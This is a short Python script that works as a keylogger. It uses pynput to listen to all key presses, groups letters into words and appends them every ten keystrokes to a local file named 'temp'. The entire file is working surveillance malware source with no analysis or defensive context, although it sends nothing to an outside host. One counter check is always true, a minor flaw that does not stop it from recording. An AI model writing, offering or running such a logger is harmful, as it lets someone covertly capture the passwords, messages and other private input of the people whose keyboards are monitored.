from pynput.keyboard import Key, Listener, KeyCode
from string import ascii_letters

TEMP = ''
ALL_KEYS = []
NEW_KEYS = ''
COUNT_OF = 0

def logToFile(path):
	global NEW_KEYS
	if path is None:
		with open('temp','a') as fl:
			fl.write(str(NEW_KEYS))
			ALL_KEYS.append(NEW_KEYS)
			NEW_KEYS = ''
def logToVar(key):
	global NEW_KEYS
	global COUNT_OF
	global TEMP
	if type(key) == KeyCode and key.char in ascii_letters:
		TEMP += key.char
	else:
		NEW_KEYS += TEMP + ' '
		TEMP = ''
	COUNT_OF += 1
	if COUNT_OF != 0 or COUNT_OF != 999:
		if COUNT_OF % 10 == 0:
			print('[~] Saving to file...')
			logToFile(None)

with Listener(on_press=logToVar) as lis:
	lis.join()
